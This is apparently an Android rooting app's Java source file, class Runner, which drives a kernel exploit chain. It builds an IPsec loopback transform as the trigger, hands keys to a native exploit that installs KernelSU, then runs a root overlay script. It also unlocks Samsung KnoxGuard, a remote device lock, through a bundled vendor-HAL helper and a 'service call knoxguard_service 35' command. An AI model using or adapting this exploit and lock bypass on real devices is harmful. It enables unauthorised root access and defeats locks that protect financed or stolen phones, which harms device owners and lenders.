package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Owns the exploit chain: sets up the IPsec trigger, hands control to the
 * native library and, once the chain has installed KernelSU, applies the
 * mount-master overlay so the freshly installed modules are visible to every
 * process.
 */
final class Runner {

    static final int ICV_LEN = 16;

    private static final String TAG = "dfroot";
    private static final String KG_SERVICE = "knoxguard_service";
    private static final String KG_UNLOCK = "service call " + KG_SERVICE + " 35";
    private static final String KG_STATE = "service call " + KG_SERVICE + " 29";
    private static final String KGTA_ASSET = "kgta_helper";
    private static final long OVERLAY_CLAIM_TIMEOUT_MS = 120000;
    private static final long OVERLAY_POLL_MS = 3000;
    private static final long OVERLAY_SU_TIMEOUT_MS = 15;

    private static final AtomicBoolean CLAIMED = new AtomicBoolean(false);
    private static final AtomicBoolean OVERLAY_RUNNING = new AtomicBoolean(false);

    private Runner() {
    }

    static boolean claim() {
        return CLAIMED.compareAndSet(false, true);
    }

    static void release() {
        CLAIMED.set(false);
    }

    static int run(Context ctx, IReporter reporter, boolean softReboot) throws Exception {
        IpSecManager.UdpEncapsulationSocket encapSock = null;
        IpSecManager.SecurityParameterIndex spiObj = null;
        IpSecTransform transform = null;
        try {
            reporter.report("=== setup ===\n");
            IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
            if (ipsec == null) {
                throw new IllegalStateException("no IPSEC_SERVICE");
            }

            encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            reporter.report("encap port: " + encapPort + "\n");

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            spiObj = ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");

            SecureRandom rng = new SecureRandom();
            byte[] aesKey = new byte[32];
            rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32];
            rng.nextBytes(hmacKey);

            IpSecAlgorithm enc = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            transform = new IpSecTransform.Builder(ctx)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            stageAsset(ctx, "ksud", true, ctx.getFilesDir());
            File ksud = new File(ctx.getFilesDir(), "ksud");
            reporter.report("ksud staged to: " + ksud.getAbsolutePath()
                    + " (" + ksud.length() + " bytes)\n");
            reporter.report("\n=== exploit ===\n");

            int rc = MainActivity.nativeRunAll(reporter, encapPort, spiVal,
                    aesKey, hmacKey, ICV_LEN, senderPort, ksud.getAbsolutePath(), softReboot);

            if (rc == 0) {
                applyOverlay(ctx, reporter, 120000L);
            }
            return rc;
        } finally {
            closeQuietly(transform);
            closeQuietly(spiObj);
            closeQuietly(encapSock);
        }
    }

    static void applyOverlay(Context ctx, IReporter reporter, long maxWaitMillis) {
        long claimDeadline = System.currentTimeMillis() + OVERLAY_CLAIM_TIMEOUT_MS;
        while (true) {
            if (OVERLAY_RUNNING.compareAndSet(false, true)) {
                try {
                    applyOverlayLocked(ctx, reporter, maxWaitMillis);
                    return;
                } finally {
                    OVERLAY_RUNNING.set(false);
                }
            } else if (System.currentTimeMillis() > claimDeadline) {
                reporter.report("[overlay] another application never finished; skipped\n");
                return;
            } else {
                try {
                    Thread.sleep(OVERLAY_POLL_MS);
                } catch (InterruptedException e) {
                    return;
                }
            }
        }
    }

    private static void applyOverlayLocked(Context ctx, IReporter reporter, long maxWaitMillis) {
        reporter.report("[overlay] ns app=" + readLink("/proc/self/ns/mnt")
                + " su=" + firstLine(runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "-c", "readlink /proc/self/ns/mnt"))
                + " su--mount-master=" + firstLine(runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "readlink /proc/self/ns/mnt"))
                + "\n");

        long deadline = System.currentTimeMillis() + maxWaitMillis;
        int attempts = 0;
        boolean usable = false;
        while (!usable) {
            attempts++;
            usable = suUsable();
            if (!usable && System.currentTimeMillis() < deadline) {
                try {
                    Thread.sleep(OVERLAY_POLL_MS);
                } catch (InterruptedException e) {
                    return;
                }
            } else {
                break;
            }
        }
        if (!usable) {
            reporter.report("[overlay] su still not usable after " + attempts + " checks; overlay skipped\n");
            return;
        }
        reporter.report("[overlay] su usable after " + attempts + " check(s)\n");

        File applyScript = new File("/data/dfroot/apply.sh");
        if (!applyScript.exists()) {
            reporter.report("[overlay] " + applyScript + " not present; skipped (KernelSU mounts modules itself)\n");
        } else {
            String out = runAndRead(90L, "su", "--mount-master", "-c", "sh " + applyScript);
            if (out == null) {
                reporter.report("[overlay] did not run (no su, or it timed out)\n");
            } else {
                reporter.report("[overlay] applied\n" + out);
            }
        }

        applyKgFix(ctx, reporter);
    }

    /**
     * Two unlock paths. The vendor HAL (vendor.samsung.hardware.tlc.kg-service)
     * accepts uid 0/1000 and exposes tz_unlockScreen without the KG STATUS
     * permission, so the root helper works even when the Java service rejects
     * uid 10085. The Java path still runs afterwards for the lock-screen
     * unbind and the cached knox.kg.state property. Both are idempotent.
     */
    private static void applyKgFix(Context ctx, IReporter reporter) {
        String hal = runKgtaHelper(ctx, "unlock");
        String unlock = runAndRead(30L, "su", "10085", "-c", KG_UNLOCK);
        if (unlock == null || unlock.trim().isEmpty()) {
            unlock = runAndRead(30L, "su", "--mount-master", "-c",
                    "/system/bin/su 10085 -c '" + KG_UNLOCK + "'");
        }
        String ta = runAndRead(20L, "su", "-c", KG_STATE);
        String prop = runAndRead(20L, "su", "-c", "getprop knox.kg.state");
        reporter.report("[kg] hal=" + oneLine(hal)
                + " unlock=" + oneLine(unlock)
                + " state=" + taState(ta)
                + " prop=" + oneLine(prop) + "\n");
    }

    /**
     * Extract the arm64 helper from assets and run it as root. The helper
     * dlopens /system/lib64/aidl_comm_kg_client.so and calls the vendor KG
     * HAL (TZ_KGTA_getKgState / TZ_KGTA_unlockScreen). It returns state/err
     * and, for "unlock", unlock/err.
     */
    private static String runKgtaHelper(Context ctx, String action) {
        File helper = new File(ctx.getFilesDir(), "kgta_helper");
        try (InputStream in = ctx.getAssets().open(KGTA_ASSET);
             OutputStream out = new FileOutputStream(helper)) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) > 0) {
                out.write(buffer, 0, read);
            }
        } catch (IOException e) {
            return "helper-asset-error: " + e.getMessage();
        }
        helper.setReadable(true, false);
        helper.setExecutable(true, false);
        return runAndRead(30L, "su", "-c", helper.getAbsolutePath() + " " + action);
    }

    private static String oneLine(String value) {
        if (value == null) {
            return "null";
        }
        String flat = value.trim().replace('\n', ' ');
        return flat.length() > 120 ? flat.substring(0, 120) + "..." : flat;
    }

    private static int taState(String parcel) {
        if (parcel == null) {
            return -1;
        }
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("([0-9a-fA-F]{8})\\s+([0-9a-fA-F]{8})")
                .matcher(parcel);
        if (!m.find()) {
            return -1;
        }
        try {
            return (int) Long.parseLong(m.group(2), 16);
        } catch (Throwable t) {
            return -1;
        }
    }

    private static String runAndRead(long timeoutSeconds, String... argv) {
        Process process = null;
        try {
            process = new ProcessBuilder(argv).redirectErrorStream(true).start();
            if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                process.destroyForcibly();
                return null;
            }
            StringBuilder out = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            try {
                String line;
                while ((line = reader.readLine()) != null && out.length() < 16384) {
                    out.append(line).append('\n');
                }
            } finally {
                reader.close();
            }
            return out.toString();
        } catch (Throwable t) {
            return null;
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    private static boolean suUsable() {
        String out = runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "id");
        return out != null && out.contains("uid=0");
    }

    private static String firstLine(String value) {
        if (value == null) {
            return "unavailable";
        }
        int nl = value.indexOf('\n');
        return nl < 0 ? value.trim() : value.substring(0, nl).trim();
    }

    private static String readLink(String path) {
        try {
            Path p = Paths.get(path);
            return Files.readSymbolicLink(p).toString();
        } catch (Throwable t) {
            return "?";
        }
    }

    static void stageAsset(Context ctx, String name, boolean executable, File dir) throws IOException {
        File dest = new File(dir, name);
        File tmp = new File(dest.getPath() + ".tmp");

        try (InputStream in = ctx.getAssets().open(name);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
        }

        if (!tmp.renameTo(dest)) {
            //noinspection ResultOfMethodCallIgnored
            tmp.delete();
            throw new IOException("rename failed: " + dest);
        }
        if (executable) {
            //noinspection ResultOfMethodCallIgnored
            dest.setExecutable(true, false);
        }
    }

    private static void closeQuietly(AutoCloseable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (Throwable ignored) {
            }
        }
    }
}
